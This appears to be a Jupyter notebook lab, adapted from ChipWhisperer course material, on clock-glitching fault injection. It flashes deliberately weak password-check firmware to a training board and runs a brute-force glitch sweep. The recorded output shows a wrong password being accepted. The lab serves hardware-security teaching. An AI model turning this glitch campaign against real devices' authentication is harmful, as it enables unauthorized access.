# Fault Injection - Clock Glitching - Password

---
NOTE: This lab references some (commercial) training material on [ChipWhisperer.io](https://www.ChipWhisperer.io). You can freely execute and use the lab per the open-source license (including using it in your own courses if you distribute similarly), but you must maintain notice about this source location. Consider joining our training course to enjoy the full experience.

---

# Note
This notebook is primarily based on the fault injection clock glitching notebook from chipwhisperer repository with some customized changes

/chipwhisperer/jupyter/courses/fault101/Fault 1_1 - Introduction to Clock Glitching.ipynb 

The figures in this notebook are also from the original chipwhisperer notebook

# Overview
1. Descuss what a Fault Injection attack is and how it works
2. Understand our board setup and how to communicate with it
3. Take a look at a password check program provided by chipwhisperer; try the correct password and incorrect password
4. Run a Fault Injection Campaign and bypass the password check given an incorrect password! 

## 1- Fault Injection Attack - Clock Glitching 

Digital hardware devices almost always expect some form of reliable clock. We can manipulate the clock being presented to the device to cause unintended behaviour. We'll be concentrating on microcontrollers here, however other digital devices (e.g. hardware encryption accelerators) can also have faults injected using this technique.

Consider a microcontroller first. The following figure is an excerpt from the Atmel AVR ATMega328P datasheet:

![A2_1](img/Mcu-unglitched.png)

Rather than loading each instruction from FLASH and performing the entire execution, the system has a pipeline to speed up the execution process. This means that an instruction is being decoded while the next one is being retrieved, as the following diagram shows:

![A2_2](img/Clock-normal.png)

But if we modify the clock, we could have a situation where the system doesn't have enough time to actually perform an instruction. Consider the following, where Execute #1 is effectively skipped. Before the system has time to actually execute it another clock edge comes, causing the microcontroller to start execution of the next instruction:

![A2_3](img/Clock-glitched.png)

# Step 1 - Setting Up the ChipWhisperer Board

***CHANGE THE PLATFORM FOR YOUR BOARD*** 

Board | Correct Platform 
------|---------------
XMEGA | CWLITEXMEGA
STM32 | CWLITEARM

# (STM32F) Run for STM32F3

In [1]:
SCOPETYPE = 'OPENADC'
#PLATFORM='CW308_STM32F3'
PLATFORM = 'CWLITEARM'  # OR 'CWLITEXMEGA'
SS_VER = 'SS_VER_2_1'

# Detect, Compile, and Upload to ChipWhisperer

In [2]:
# Run setup script twice to correctly set capture clock
import os
setupScript = "/home/"+os.getenv("USER")+"/chipwhisperer/jupyter/Setup_Scripts/Setup_Generic.ipynb"
%run "{setupScript}"
%run "{setupScript}"

INFO: Found ChipWhisperer😍
scope.gain.mode                          changed from low                       to high                     
scope.gain.gain                          changed from 0                         to 30                       
scope.gain.db                            changed from 5.5                       to 24.8359375               
scope.adc.basic_mode                     changed from low                       to rising_edge              
scope.adc.samples                        changed from 24400                     to 5000                     
scope.adc.trig_count                     changed from 16927426                  to 38973879                 
scope.clock.adc_src                      changed from clkgen_x1                 to clkgen_x4                
scope.clock.adc_freq                     changed from 0                         to 29538459                 
scope.clock.adc_rate                     changed from 0.0                       to 29538459.0        

In [3]:
%%bash -s "$PLATFORM" "$SS_VER"
#cd ../../../firmware/mcu/simpleserial-glitch
# change the path if needed 
cd /home/$USER/chipwhisperer/firmware/mcu/simpleserial-glitch
make PLATFORM=$1 CRYPTO_TARGET=NONE SS_VER=$2 -j

SS_VER set to SS_VER_2_1
SS_VER set to SS_VER_2_1
arm-none-eabi-gcc (15:10.3-2021.07-4) 10.3.1 20210621 (release)
Copyright (C) 2020 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

mkdir -p objdir-CWLITEARM 
.
Welcome to another exciting ChipWhisperer target build!!
.
.
.
.
Compiling:
Compiling:
Compiling:
Compiling:
.
-en     simpleserial-glitch.c ...
-en     .././simpleserial/simpleserial.c ...
-en     .././hal/hal.c ...
-en     .././hal//stm32f3/stm32f3_hal.c ...
Compiling:
-en     .././hal//stm32f3/stm32f3_hal_lowlevel.c ...
.
Compiling:
.
-en     .././hal//stm32f3/stm32f3_sysmem.c ...
Assembling: .././hal//stm32f3/stm32f3_startup.S
arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -x assembler-with-cpp -mthumb -mfloat-abi=soft -fmessage-length=0 -ffunction-sections -DF_CPU=7372800 -Wa,-gstabs,-adhlns=objdir-CWLITEARM/stm32f3_startup.lst -I.././simpleserial/

In [4]:
from pathlib import Path

# Define the path of our firmware and macke sure it exists
# path = "../../../firmware/mcu/PASS_CHECK_STRNCMP/simpleserial-glitch-{}.hex".format(PLATFORM)
# change the path if needed
path = "/home/boyang/chipwhisperer/firmware/mcu//simpleserial-glitch/simpleserial-glitch-{}.hex".format(PLATFORM)

if not Path(path).exists():
    print(f"Warning, no path: {path}")
    raise Exception
else:
    print(f"Program path: {path}")

# And with this line we flash the target! Just like that. 
cw.program_target(scope, prog, path)
if SS_VER == 'SS_VER_2_1':
    target.reset_comms()

Program path: /home/boyang/chipwhisperer/firmware/mcu//simpleserial-glitch/simpleserial-glitch-CWLITEARM.hex
Detected known STMF32: STM32F302xB(C)/303xB(C)
Extended erase (0x44), this can take ten seconds or more
Attempting to program 5867 bytes at 0x8000000
STM32F Programming flash...
STM32F Reading flash...
Verified flash OK, 5867 bytes


# Step 1b - Make sure we can reboot when we break things :D 

When we run our attacks, we are likely going to ***crash the device***. 

Well, when that happens all we have to do is reboot it. If you are wanting a  
workout, we can unplug and plug in the device every crash, but lets be lazy and 
automate this. 

***Function*** `reboot_flush()` defined below will reset the device for us.

In [5]:
if PLATFORM == "CWLITEXMEGA":
    def reboot_flush():            
        scope.io.pdic = False
        time.sleep(0.2)
        scope.io.pdic = "high_z"
        time.sleep(0.2)
        #Flush garbage too
        target.flush()
else:
    def reboot_flush():            
        scope.io.nrst = False
        time.sleep(0.02)
        scope.io.nrst = "high_z"
        time.sleep(0.02)
        #Flush garbage too
        target.flush()

# Step 2 - Communicate with the Device 

We will comunicate using ***serial*** comms.The device will be listening for us, and we will be 
listening for the device AFTER we first send a message. 

Well, because we are likely crashing the device, sometimes we hear _nothing_ back. The function 
`simpleserial_read_witherrors` will allow us to listen for a short time, but then assume the 
device crashed with we don't hear back. 


In [6]:
# Clear the device real quick 
reboot_flush()

# WRITE to the serial line a "p"
# Passing "p" will enable the password program
# Passing a test password with one char 0x00
target.simpleserial_write("p", bytearray([0x00]))

# READ from the serial, use a 
# cmd = 'r'
# Number of Bytes to read from serial = 1, the return from the password program
# timeout = 10ms
val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10)

# See if the return was valid! 
valid = val['valid']
if valid:
    response = val['payload']
    raw_serial = val['full_response']
    error_code = val['rv']

    print(f"VALID RESPONSE")
    print("==============")
    print(f"Board Responds: {response}")
    print(f"Raw Response: {raw_serial}")
    print(f"Error Code?: {error_code}")
else:
    print(f"The response is INVALID; Raw Response is: {val}")

VALID RESPONSE
Board Responds: CWbytearray(b'00')
Raw Response: CWbytearray(b'00 72 01 00 99 00')
Error Code?: bytearray(b'\x00')


# Step 3 - A Look at the Target Program

For this lab, our goal is to get the following code to return variable passok as 1 (i.e., passing verification) given an incorrect password. The source code can be found in 

/chipwhisperer/firmware/mcu/simpleserial-glitch/simpleserial-glitch.c

```python

#if SS_VER == SS_VER_2_1
uint8_t password(uint8_t cmd, uint8_t scmd, uint8_t len, uint8_t* pw)
#else
uint8_t password(uint8_t* pw, uint8_t len)
#endif
{
    char passwd[] = "touch";
    char passok = 1;
    int cnt;

    trigger_high();

    # Simple test - does not check for too-long password!
    for(cnt = 0; cnt < 5; cnt++){
        if (pw[cnt] != passwd[cnt]){
            passok = 0;
        }
    }

    trigger_low();

    simpleserial_put('r', 1, (uint8_t*)&passok);
    return 0x00;
}
```

As we can see from the above program, the real password is hard-coded in the program for the ease of demonstration. If the given password is correct, the varialbe passok remains to be 1. Otherwise, passok will be updated to 0.  

Given incorrect chars in the provided password, if gliching happens at the time when `passok = 0`, we can prevent the program from updating the value of passok from 1 to 0, which will allow the incorrect password pass the verification.   

# Step 3b - Sending a wrong password

In [7]:
reboot_flush()

# We'll send all 00's as the password, and see what the device has to say
password = bytearray([0x00]*5)

# Write the password to the serial. 
target.simpleserial_write('p', password)

val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10)#For loop check
valid = val['valid']
if valid:
    response = val['payload']
    raw_serial = val['full_response']
    error_code = val['rv']
    print(f"VALID RETURN")
    print("============")
    print(f"The raw response is: {val}")
    print(f"PASSWORD ACCEPTED? {int(val['payload'].hex()) == 1}")
else:
    print(f"INVALID RETURN")

VALID RETURN
The raw response is: {'valid': True, 'payload': CWbytearray(b'00'), 'full_response': CWbytearray(b'00 72 01 00 99 00'), 'rv': bytearray(b'\x00')}
PASSWORD ACCEPTED? False


# Step 3c - Sending the correct password

In [8]:
# Flush the device 
reboot_flush()

# Write the password "touch" in ASCII to the device
pw = bytearray([0x74, 0x6F, 0x75, 0x63, 0x68])
target.simpleserial_write('p', pw)

# Attempt to read a response from the device 
val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10)#For loop check
valid = val['valid']
if valid:
    response = val['payload']
    raw_serial = val['full_response']
    error_code = val['rv']
    print(f"VALID RETURN")
    print("============")
    print(f"The raw response is: {val}")
    print(f"PASSWORD ACCEPTED? {int(val['payload'].hex()) == 1}")
else:
    print(f"INVALID RETURN")

VALID RETURN
The raw response is: {'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
PASSWORD ACCEPTED? True


# Step 4 - Fault Campaign; Time to bypass the password

Here we now 
1. Define the "glitch controller" - this will inject the clock glitches
2. Display the settings of the glitch controller in real time
3. Plot the effectiveness of the attack in real time.

#### Three Glitch settings

* offset

> Where in the output clock to place the glitch. Can be in the range `[-48.8, 48.8]`. Often, we'll want to try many offsets when trying to glitch a target.
* width
> How wide to make the glitch. Can be in the range `[-50, 50]`, though there is no reason to use widths < 0. Wider glitches more easily cause glitches, but are also more likely to crash the target, meaning we'll often want to try a range of widths when attacking a target.


* ext_offset

> The number of clock cycles after the trigger to put the glitch.

 We'll also setup a large `repeat` to make glitching easier.

#### CW Glitch Controller

To make creating a glitch loop easier, ChipWhisperer includes a glitch controller. We'll start of by initializing with with different potential results of the attack. You define these to be whatever you want, but often three groups are sufficient:

1. `"success"`, where our glitch had the desired effect
1. `"reset"`, where our glitch had an undesirable effect. Often, this effect is crashing or resetting the target, which is why we're calling it `"reset"`
1. `"normal"`, where you glitch didn't have a noticable effect.

We also need to tell it what glitch parameters we want to scan through, in this case width and offset:

In [9]:
gc = cw.GlitchController(groups=["success", "reset", "normal"], parameters=["width", "offset", "tries"])
gc.display_stats()

IntText(value=0, description='success count:', disabled=True)

IntText(value=0, description='reset count:', disabled=True)

IntText(value=0, description='normal count:', disabled=True)

FloatSlider(value=0.0, continuous_update=False, description='width setting:', disabled=True, max=10.0, readout…

FloatSlider(value=0.0, continuous_update=False, description='offset setting:', disabled=True, max=10.0, readou…

FloatSlider(value=0.0, continuous_update=False, description='tries setting:', disabled=True, max=10.0, readout…

In [10]:
gc.glitch_plot(plotdots={"success":"+g", "reset":"xr"})#, "normal":'xb'})

Trigger still high! 
Trigger still high! 
Trigger still high! 
Trigger still high! 
Trigger still high! 
Trigger still high! 
Trigger still high! 
8.984375 3.90625 8 
Trigger still high! 
Trigger still high! 
Trigger still high! 
7.03125 0.0 8 
Parameter name clashes for keys ['data']

:DynamicMap   []
   :Overlay
      .Points.I  :Points   [width,offset]
      .Points.II :Points   [width,offset]

# 4b - Run the Campagin! 

Below we define the function `brute_force`. This function is iterativelly sweep thousands of combinations of `width`, `offset` and `ext_offset`. 

By doing so, we should find a few combinations that craft a glitch just right - one that skips instructions in the password check function allowing 
us to bypass the check! 

In [11]:
import chipwhisperer.common.results.glitch as glitch
from tqdm.notebook import trange
import struct

from tqdm.notebook import tqdm
import re
import struct

scope.glitch.clk_src = "clkgen" 
scope.glitch.output = "clock_xor" # glitch_out = clk ^ glitch
scope.glitch.trigger_src = "ext_single" # glitch only after scope.arm() called
scope.io.hs2 = "glitch"  # output glitch_out on the clock line
scope.cglitch_setup()

scope.glitch.ext_offset = 8

def brute_force(gc, width: tuple[int,int] = (1,10), offset: tuple[int,int] = (-4,4), ext_offset: tuple[int,int] = (0,96)):
    gc.set_range('width', width[0], width[1])
    gc.set_range('offset', offset[0], offset[1])
    #gc.set_range('ext_offset', ext_offset[0], ext_offset[1])    
    gc.set_global_step([16,8,4,2,1])
    
    step = 1
    
    scope.glitch.repeat = 5
    reboot_flush()
    
    # Now we brute force all combinations of the settings
    for glitch_settings in gc.glitch_values():
        #print(glitch_settings)
        scope.glitch.offset = glitch_settings[1]
        scope.glitch.width = glitch_settings[0]
        # scope.glitch.ext_offset = glitch_settings[2]
        if scope.adc.state:
            # can detect crash here (fast) before timing out (slow)
            print("Trigger still high!")
            gc.add("reset")
    
            #Device is slow to boot?
            reboot_flush()
        reboot_flush()
    
        # Arm the scope, write the password, and capture
        scope.arm()    
        target.simpleserial_write('p', bytearray([0x00]*5)) #send an incorrect password
        ret = scope.capture()

        # See if we get a good return 
        val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10, timeout=50) #For loop check
        
        if ret:
            print('Timeout - no trigger')
            gc.add("reset")    
            reboot_flush()
        else:
            # If the return is not valid, the device was reset
            if not val['valid']: 
                gc.add("reset")
            else:
                # IF we do have a valid return, it should be between 0 and 1 
                retcode = int(val['payload'].hex(), 16)
                if retcode == 1: 
                    # Correct! An incorrect Password was accepted!
                    gc.add("success")
                    print(val['payload'])
                    print(scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset)
                elif retcode == 0:
                    # An incorrect password was denied! This is to be expected.
                    gc.add("normal")
brute_force(gc)

scope.clock.adc_freq                     changed from 29538459                  to 29538471                 
scope.clock.adc_rate                     changed from 29538459.0                to 29538471.0               
scope.io.hs2                             changed from glitch                    to clkgen                   


(ChipWhisperer Glitch WARNING|File ChipWhispererGlitch.py:795) Partial reconfiguration for offset = 0 may not work
(ChipWhisperer Glitch WARNING|File ChipWhispererGlitch.py:795) Partial reconfiguration for offset = 0 may not work
(ChipWhisperer Glitch WARNING|File ChipWhispererGlitch.py:795) Partial reconfiguration for offset = 0 may not work
(ChipWhisperer Glitch WARNING|File ChipWhispererGlitch.py:795) Partial reconfiguration for offset = 0 may not work
(ChipWhisperer Glitch WARNING|File ChipWhispererGlitch.py:795) Partial reconfiguration for offset = 0 may not work
(ChipWhisperer Glitch WARNING|File ChipWhispererGlitch.py:795) Partial reconfiguration for offset = 0 may not work
(ChipWhisperer Glitch WARNING|File ChipWhispererGlitch.py:795) Partial reconfiguration for offset = 0 may not work
(ChipWhisperer Glitch WARNING|File ChipWhispererGlitch.py:795) Partial reconfiguration for offset = 0 may not work
(ChipWhisperer Glitch WARNING|File ChipWhispererGlitch.py:795) Partial reconfigu

Trigger still high!


(ChipWhisperer Glitch WARNING|File ChipWhispererGlitch.py:795) Partial reconfiguration for offset = 0 may not work
(ChipWhisperer Glitch WARNING|File ChipWhispererGlitch.py:795) Partial reconfiguration for offset = 0 may not work
(ChipWhisperer Glitch WARNING|File ChipWhispererGlitch.py:795) Partial reconfiguration for offset = 0 may not work
(ChipWhisperer Glitch WARNING|File ChipWhispererGlitch.py:795) Partial reconfiguration for offset = 0 may not work
(ChipWhisperer Glitch WARNING|File ChipWhispererGlitch.py:795) Partial reconfiguration for offset = 0 may not work
(ChipWhisperer Glitch WARNING|File ChipWhispererGlitch.py:795) Partial reconfiguration for offset = 0 may not work
(ChipWhisperer Glitch WARNING|File ChipWhispererGlitch.py:795) Partial reconfiguration for offset = 0 may not work
(ChipWhisperer Glitch WARNING|File ChipWhispererGlitch.py:795) Partial reconfiguration for offset = 0 may not work
(ChipWhisperer Glitch WARNING|File ChipWhispererGlitch.py:795) Partial reconfigu

Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!


...

Trigger still high!


(ChipWhisperer Glitch WARNING|File ChipWhispererGlitch.py:795) Partial reconfiguration for offset = 0 may not work
(ChipWhisperer Glitch WARNING|File ChipWhispererGlitch.py:795) Partial reconfiguration for offset = 0 may not work


Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!


(ChipWhisperer Glitch WARNING|File ChipWhispererGlitch.py:795) Partial reconfiguration for offset = 0 may not work
(ChipWhisperer Glitch WARNING|File ChipWhispererGlitch.py:795) Partial reconfiguration for offset = 0 may not work
(ChipWhisperer Glitch WARNING|File ChipWhispererGlitch.py:795) Partial reconfiguration for offset = 0 may not work
(ChipWhisperer Glitch WARNING|File ChipWhispererGlitch.py:795) Partial reconfiguration for offset = 0 may not work
(ChipWhisperer Glitch WARNING|File ChipWhispererGlitch.py:795) Partial reconfiguration for offset = 0 may not work
(ChipWhisperer Glitch WARNING|File ChipWhispererGlitch.py:795) Partial reconfiguration for offset = 0 may not work
(ChipWhisperer Glitch WARNING|File ChipWhispererGlitch.py:795) Partial reconfiguration for offset = 0 may not work
(ChipWhisperer Glitch WARNING|File ChipWhispererGlitch.py:795) Partial reconfiguration for offset = 0 may not work
(ChipWhisperer Glitch WARNING|File ChipWhispererGlitch.py:795) Partial reconfigu

Trigger still high!
CWbytearray(b'01')
10.15625 1.171875 8
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
CWbytearray(b'01')
10.15625 1.171875 8
Trigger still high!
CWbytearray(b'01')
10.15625 1.171875 8
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!


### Results

In addition to plotting, the glitch controller also has the capability to return results as a list that groups paramters and results. These results give both the number of each result, as well as the rate of each result:

In [ ]:
gc.calc()

You can also get results back with some parameters ignored. Results from parameters that now match will be grouped. This is particularly useful with something like the `"tries"` parameter, as you don't typically care whether a glitch was successful on your first, second, or third attempt:

In [ ]:
results = gc.calc(ignore_params="tries")
results

Finally, `calc()` can also sort by different results. A common use for this is to sort by success rate:

In [ ]:
results = gc.calc(ignore_params="tries", sort="success_rate")
results

Make sure you write down those glitch settings, since we'll be using for the rest of the glitching labs! In fact, we'll be using a lot of the general code structure here for the rest of the labs, with the only big changes being:

### Repeat

This lab used a pretty large repeat value. Like the name suggests, this setting controls how many times the glitch is repeated (i.e. a repeat value of 5 will place glitches in 5 consecutive clock cycles). Consider that each glitch inserted has a chance to both cause a glitch or crash the device. This was pretty advantageous for this lab since we had a lot of different spots we wanted to place a glitch - using a high repeat value increased our chance for a crash, but also increased our chance for a successful glitch. For an attack where we're targeting a single instruction, we don't really increase our glitch chance at all, but still have the increased crash risk. Worse yet, a successful glitch in a wrong spot may also cause a crash! It is for that reason that it's often better to use a low repeat value when targeting a single instruction.

### Ext Offset

The ext offset setting controls a delay between the trigger firing and the glitch being inserted. Like repeat, it's based on whole clock cycles, meaning an ext offset of 10 will insert a glitch 10 cycles after the trigger fires. We didn't have to worry about this setting for this lab since the large repeat value was able to take us into the area we wanted. This won't be true for many applications, where you'll have to try glitches at a large variety of ext_offsets.

### Success, Reset, and Normal

These three result states are usually enough to describe most glitch results. What constitues a success, however, will change based on what firmware you're attacking. For example, if we were attacking the Linux authentication, we might base success on a check to see whether or not we're root.

In [ ]:
scope.dis()
target.dis()